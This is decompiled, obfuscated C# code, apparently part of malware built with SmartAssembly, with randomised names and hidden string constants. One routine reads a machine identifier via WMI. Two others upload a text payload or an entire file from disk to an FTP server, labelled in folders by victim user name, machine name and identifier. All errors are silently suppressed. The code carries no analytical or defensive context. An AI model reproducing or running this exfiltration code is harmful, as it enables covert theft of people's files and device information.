using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ybfSLIGKlaODvJ;

internal sealed class wdiXDjuJgNGJ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string DThwkdtaJZ()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107402902));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107402913)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107402864);
			ManagementObject val3 = new ManagementObject(getString_0(107402891) + text2 + getString_0(107402850));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107402813)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107390169) : text;
		}
	}

	public static void rxhbvaQakaHGk(string FBBIccUvWrVUAS = "URL", string DyMzewSubSXW = "USERNAME", string sLSxclXXcH = "ACCESO", string sQfMxhmCwNjuYCj = "")
	{
		try
		{
			string text = DThwkdtaJZ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(FBBIccUvWrVUAS + getString_0(107404473) + Environment.UserName + getString_0(107404492) + Environment.MachineName + getString_0(107404439) + text + getString_0(107404434));
			ftpWebRequest.Method = getString_0(107402820);
			ftpWebRequest.Credentials = new NetworkCredential(DyMzewSubSXW, sLSxclXXcH);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(sQfMxhmCwNjuYCj);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void DCRZpKamZEizX(string NpxSRGoZfhA = "URL", string eGUZyYFayQJ = "USERNAME", string xfuTeElKIwLg = "ACCESO", string eaakaLZUkwZJ = "")
	{
		try
		{
			string text = DThwkdtaJZ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(NpxSRGoZfhA + getString_0(107404473) + Environment.UserName + getString_0(107404492) + Environment.MachineName + getString_0(107404439) + text + getString_0(107404439) + Path.GetFileName(eaakaLZUkwZJ));
			ftpWebRequest.Method = getString_0(107402820);
			ftpWebRequest.Credentials = new NetworkCredential(eGUZyYFayQJ, xfuTeElKIwLg);
			byte[] array = File.ReadAllBytes(eaakaLZUkwZJ);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static wdiXDjuJgNGJ()
	{
		Strings.CreateGetStringDelegate(typeof(wdiXDjuJgNGJ));
	}
}
